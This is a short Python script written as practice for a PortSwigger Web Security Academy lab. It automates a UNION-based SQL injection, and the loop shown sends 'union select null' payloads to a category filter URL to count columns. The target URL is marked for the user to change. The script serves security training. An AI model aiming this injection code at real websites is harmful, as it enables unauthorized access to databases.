import requests
import json
import urllib

# Description:
# An automated SQL 'Union based' exploit script to perform the following:
# (1) identify number of columns
# (2) identify which column are String type
# (3) inject query
#
# This is my OSWE prep to better python scripting skills. 
# The lab used for this practice can be found in Portswigger Academy
# Web Security Academy > SQL injection > UNION attacks > Lab

# URL of target

#modify here ---------
baseURL = "https://0a9f00b003c1f9e1c1c645710024005b.web-security-academy.net"
#modify end ----------

exploitURL = baseURL + "/filter?category="
loginURL = baseURL + "/login"

found = False;
col_index = 0  # counter for no. of columns

#--(i) detect columns--------------------------------------------------
print("Detecting no of columns with union attack...")

while(found == False):
	payload = "' union select {}null--".format(col_index*'null,')
	res = requests.get(exploitURL+payload)
	if (res.status_code == 200):
		found = True
		break
	else:
		col_index=col_index+1

col_count = col_index+1
print("	[+] Found! Total columns detected = {}\n".format(col_count))
